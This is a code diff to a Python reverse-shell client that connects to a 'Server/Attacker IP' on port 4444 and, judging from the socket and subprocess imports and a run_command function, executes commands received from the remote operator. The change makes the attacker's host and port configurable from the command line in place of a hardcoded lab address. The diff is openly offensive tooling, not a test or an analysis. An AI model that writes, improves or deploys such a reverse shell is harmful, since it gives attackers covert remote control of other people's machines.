@@ -1,6 +1,14 @@
 import socket
 import subprocess
 import sys
+import argparse
+
+parser = argparse.ArgumentParser(description='Shell Client')
+
+parser.add_argument('-s', '--server', required=True, help='Server/Attacker IP')
+parser.add_argument('-p', '--port', default=4444, help='Server/Attacker Port Number')
+
+args = parser.parse_args()
 
 def run_command(command: str):
     try:
@@ -38,4 +46,5 @@ def client(ip: str, port: int = 4444):
             print(f'[-] Exiting...')
             sys.exit(-1)
 
-client('192.168.56.1', 4444)
+if __name__ == '__main__':
+    client(args.server, args.port)
